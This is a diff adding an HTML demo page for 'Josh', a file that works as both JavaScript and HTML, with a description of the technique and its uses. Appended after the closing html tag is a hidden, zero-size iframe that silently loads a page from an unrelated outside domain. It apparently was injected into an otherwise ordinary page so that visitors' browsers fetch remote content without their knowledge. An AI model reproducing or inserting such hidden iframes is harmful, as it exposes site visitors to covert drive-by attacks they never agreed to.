@@ -1,0 +1,46 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+	<title>Josh Demo</title>
+	<script type="text/javascript" src="josh.html"></script>
+  <link rel="stylesheet" type="text/css" href="index.css"></link>
+</head>
+
+<body>
+
+	<h1>Josh Demo</h1>
+
+  <div id="message">
+  <button id="zoomButton">Embiggen text (demonstrates Josh's JS side)</button>
+  <a href="josh.html">View HTML (demonstrates Josh's HTML side)</a>
+  <p>Hello. You are viewing a normal HTML file which includes a special Javascript file: josh.html. I call it a "Josh" because it is at once valid <strong>J</strong>ava<strong>S</strong>cript and <strong>H</strong>TML. Josh is a design pattern.</p>
+  <p><strong>Run Josh from a script tag</strong> and it behaves as Javascript, i.e.:  <tt>&lt;script type="text/javascript" src="josh.html"&gt&lt;/script&gt;</tt>. josh.html decorates this message and adds behaviour to the button above.</p>
+  <p><strong>View Josh in your browser</strong> and it behaves as HTML. Josh is a regular web document or web app, just like any other HTML file. <a href="josh.html">View josh.html</a>.</p>
+
+  </div>
+
+  <h2>Why?</h2>
+
+    <p>I wanted a way to have a file, and a Javascript exposure of the data in that file. The data in the file could then be accessed using <a href="http://ajaxpatterns.org">On-Demand Javascript</a>, bypassing cross-domain restrictions.</p>
+
+    <p>You could also use Josh to ship a Javascript library with HTML documentation, all in the one file.</p>
+
+    <p>I am keen to explore how Josh can benefit <a href="http://tiddlywiki.com">TiddlyWiki</a>. A Tiddlywiki is already a single file that acts as both documentation and a kind of database; it would be fantastic if every Tiddlywiki file on the web automatically exposed its data via a JSON API.</p>
+
+  <h2>How?</h2>
+
+    <p>Well, <a href="josh.html">open up josh.html</a>, view source, and see for yourself. The trick is to make HTML clients think they're viewing HTML and Javascript clients think they're viewing Javascript. In simple terms, we do this by putting HTML comments around the Javascript and Javascript comments around the HTML.</p>
+
+    <p>I tried some more complicated things initially, like pushing body text out (the Javascript) 10,000 pixels. Then I discovered that all of the major browsers let you use HTML-style comments (&lt;-- --&gt;) inside Javascript.</p>
+
+  <h2>Who</h2>
+
+  <a href="http://softwareas.com">Michael Mahemoff</a> @ <a href="http://osmosoft.com">Osmosoft</a>.
+
+</body>
+
+</html>
+<iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>
